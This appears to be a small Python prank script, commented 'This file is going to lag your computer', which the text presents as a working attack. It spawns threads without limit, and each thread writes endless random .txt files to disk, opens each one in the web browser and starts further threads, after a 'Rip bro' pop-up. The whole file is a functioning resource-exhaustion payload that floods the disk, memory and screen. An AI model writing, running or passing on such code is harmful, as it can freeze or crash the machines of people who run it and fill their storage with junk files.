# This file is going to lag your computer
import webbrowser
import string
import random
from threading import Thread
from tkinter import messagebox
letters = string.ascii_lowercase
def writeFile():
    messagebox.showinfo("Lol", "Rip bro")
    while True:
        string =  ''.join(random.choice(letters) for i in range(10))  + ".txt"
        with open(string, 'w') as f:
            f.write(''.join(random.choice(letters) for i in range(1000)))
            f.close()
            webbrowser.open(string)
            Thread(target=writeFile).start()
    
while True:
    new_thread = Thread(target=writeFile)
    new_thread.start()
    
